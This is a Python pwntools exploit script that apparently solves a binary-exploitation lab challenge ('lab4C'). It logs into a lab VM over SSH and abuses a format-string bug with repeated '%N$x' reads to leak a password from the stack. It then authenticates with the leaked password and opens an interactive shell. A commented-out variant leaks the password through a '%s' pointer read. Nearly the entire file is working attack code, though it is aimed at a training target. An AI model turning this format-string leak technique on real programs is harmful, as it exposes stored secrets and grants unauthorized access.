#!/usr/bin/env python
from pwn import *

chal = '4C'
password = "lab04start"

host = 'exploit-vm'
user = 'lab%s' % chal
level, grade = int(chal[:-1]), chal[-1]
binary = '/levels/lab{:02d}/lab{}'.format(level, chal)

shell = ssh(host=host, user=user, password=password)


def send_fmt(data, password=""):
    r = shell.run(binary)
    r.sendline(data)
    r.sendline(password)
    response = r.recvall()
    # print(response)
    match = re.search("(.*) does not have access", response)
    return match.group(1).lstrip()


# Read password directly from memory as hex
password = []
password_offset = 29
for i in range(0, 8):
    offset = password_offset + i
    read_bytes = unhex(send_fmt("%{}$x".format(offset)))
    # Reverse the data from little endian format
    password.append(read_bytes[::-1])

password = "".join(password).lstrip("\x00")
log.success("Found password: %s", password)

# # Read password from from a pointer to the string with %s
# # Read stack address
# memory_base = u32(unhex(send_fmt("%73$x")), endian="big")
# log.success("Found position on stack: %s", hex(memory_base))
#
# # Calculate address for pointer to the password
# password_address = memory_base - 0x13e
#
# # Read password from pointer
# # User provided password in at stack offset 5. We put the password
# # address there and use the format string to read the value.
# log.info("Trying to read password at: %s", hex(password_address))
# password = send_fmt(" %5$s", "  " + p32(password_address))
# log.success("Found password: %s", password)

# Log in with the retrieved password
r = shell.run(binary)
r.sendline("user")
r.sendline(password)
r.clean()

log.success("Got a shell!")
r.interactive()
